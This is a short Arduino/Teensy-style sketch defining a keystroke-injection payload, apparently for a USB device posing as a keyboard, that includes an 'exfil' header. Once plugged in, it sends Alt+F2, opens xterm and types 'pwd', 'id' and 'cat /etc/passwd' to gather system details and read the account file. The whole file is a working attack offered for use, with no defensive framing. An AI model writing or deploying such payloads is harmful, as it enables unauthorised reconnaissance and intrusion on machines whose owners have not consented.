#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("xterm");
  delay(3000);
  Keyboard.println("pwd");
  delay(2000);
  Keyboard.println("id");
  delay(2000);
  Keyboard.println("cat /etc/passwd");
}
